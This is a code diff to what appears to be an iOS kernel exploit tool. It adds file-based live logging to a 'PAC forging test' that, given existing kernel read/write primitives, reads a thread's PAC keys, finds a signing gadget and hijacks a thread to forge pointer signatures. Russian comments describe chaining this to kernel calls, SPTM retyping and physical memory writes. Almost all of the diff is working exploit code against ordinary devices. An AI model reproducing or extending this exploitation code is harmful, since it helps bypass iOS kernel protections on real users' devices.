@@ -4984,21 +4984,37 @@ static uint64_t kpRCIsTable = 0;
     return kp_untag_ptr(kRaw);
 }
 
+static void kpPacLive(NSString *line)
+{
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    if (!h) {
+        [line writeToFile:p atomically:NO encoding:NSUTF8StringEncoding error:nil];
+        return;
+    }
+    [h seekToEndOfFile];
+    [h writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
+    [h closeFile];
+}
+
 + (NSString *)pacTestReport
 {
     NSMutableString *r = [NSMutableString string];
-    kpNote(r, @"=== PAC forging test (TaskRop remotepac port) ===");
+    NSString *pacPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
+    [@"" writeToFile:pacPath atomically:NO encoding:NSUTF8StringEncoding error:nil];
+    void (^pacnote)(NSString *) = ^(NSString *s){ kpNote(r, @"%@", s); kpPacLive([s stringByAppendingString:@"\n"]); };
+    pacnote(@"=== PAC forging test (TaskRop remotepac port) ===");
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив — сначала эксплойт.\n"];
         return r;
     }
-    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; return r; }
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; kpPacLive(@"FAIL: is_table\n"); return r; }
 
     mach_port_t tport = mach_thread_self();
     uint64_t threadVA = [self rcResolveThreadKVA:tport];
     mach_port_deallocate(mach_task_self(), tport);
-    if (!threadVA) { [r appendString:@"FAIL: thread_t VA не резолвится\n"]; return r; }
-    kpNote(r, [NSString stringWithFormat:@"  наш thread_t @ %#llx", (unsigned long long)threadVA]);
+    if (!threadVA) { [r appendString:@"FAIL: thread_t VA не резолвится\n"]; kpPacLive(@"FAIL: thread_t VA\n"); return r; }
+    pacnote([NSString stringWithFormat:@"  наш thread_t @ %#llx", (unsigned long long)threadVA]);
 
     extern uint64_t kp_rc_kread64(uint64_t);
     extern uint64_t kp_pacia(uint64_t, uint64_t);
@@ -5009,29 +5025,31 @@ static uint64_t kpRCIsTable = 0;
 
     uint64_t keya = kp_rc_kread64(threadVA + 0x1B0);
     uint64_t keyb = kp_rc_kread64(threadVA + 0x1B8);
-    kpNote(r, [NSString stringWithFormat:@"  наши PAC keys: rop_pid=%#llx jop_pid=%#llx",
+    pacnote([NSString stringWithFormat:@"  наши PAC keys: rop_pid=%#llx jop_pid=%#llx",
               (unsigned long long)keya, (unsigned long long)keyb]);
 
     BOOL signworks = kp_pacsignworks();
-    kpNote(r, [NSString stringWithFormat:@"  userland pacia работает: %@", signworks ? @"да" : @"нет"]);
+    pacnote([NSString stringWithFormat:@"  userland pacia работает: %@", signworks ? @"да" : @"нет"]);
 
     uint64_t gadget = kp_findpacia();
-    kpNote(r, [NSString stringWithFormat:@"  pacia gadget @ %#llx %@", (unsigned long long)gadget,
+    pacnote([NSString stringWithFormat:@"  pacia gadget @ %#llx %@", (unsigned long long)gadget,
               gadget ? @"" : @"  (не найден в нашем бинаре — remotepac не взлетит)"]);
 
     // sign a test pointer with OUR keys through the hijacked pacthread
     uint64_t address = 0x0000000041414141ULL;
     uint64_t modifier = kp_ptrauthstrdisc("pc");
     uint64_t expected = kp_pacia(address, modifier);
-    kpNote(r, [NSString stringWithFormat:@"  цель: подписать %#llx mod=%#llx (ожидаем %#llx через наш userland pacia)",
+    pacnote([NSString stringWithFormat:@"  цель: подписать %#llx mod=%#llx (ожидаем %#llx через наш userland pacia)",
               (unsigned long long)address, (unsigned long long)modifier, (unsigned long long)expected]);
 
+    pacnote(@"  → вызываю kp_remotepac (thread hijack)…");
     uint64_t signed_ = kp_remotepac(threadVA, address, modifier);
-    kpNote(r, [NSString stringWithFormat:@"  remotepac → %#llx %@", (unsigned long long)signed_,
+    pacnote([NSString stringWithFormat:@"  remotepac → %#llx %@", (unsigned long long)signed_,
               signed_ == expected ? @"— СОВПАЛО С ОЖИДАНИЕМ: PAC forging через thread hijack РАБОТАЕТ!"
                                   : (signed_ == (uint64_t)-1 || signed_ == 0 ? @"— не получилось" : @"— получена, но != ожиданию (ключи другие?)")]);
     if (signed_ == expected) {
         [r appendString:@"\n=== PAC FORGING VERIFIED: подписываем любые указатели любыми ключами — с kernel_task keys это kcall на arm64e → SPTM retype → physwrite ===\n"];
+        kpPacLive(@"\n=== PAC FORGING VERIFIED ===\n");
     }
     return r;
 }
